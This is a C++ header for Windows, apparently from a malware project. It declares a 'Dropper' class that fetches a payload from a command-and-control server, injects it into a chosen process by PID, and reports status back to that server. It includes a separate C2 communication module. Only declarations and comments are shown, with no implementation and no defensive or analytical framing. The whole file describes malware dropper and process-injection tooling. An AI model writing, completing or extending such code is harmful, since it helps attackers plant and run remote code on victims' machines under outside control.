#ifndef DROPPER_H
#define DROPPER_H

#include <windows.h>
#include <vector>
#include <string>
#include "../c2/comm.h"

class Dropper {
public:
    Dropper(Comm* comm, bool debug_mode);
    ~Dropper();

    // Fetches payload from C2 or returns debug payload
    bool FetchPayload(std::vector<unsigned char>& payload);

    // Injects payload into target PID
    bool Inject(DWORD pid, const std::vector<unsigned char>& payload);

    // Reports status back to C2
    void ReportStatus(const std::string& task_id, bool success, const std::string& message);

private:
    Comm* comm;
    bool debug_mode;
};

#endif // DROPPER_H
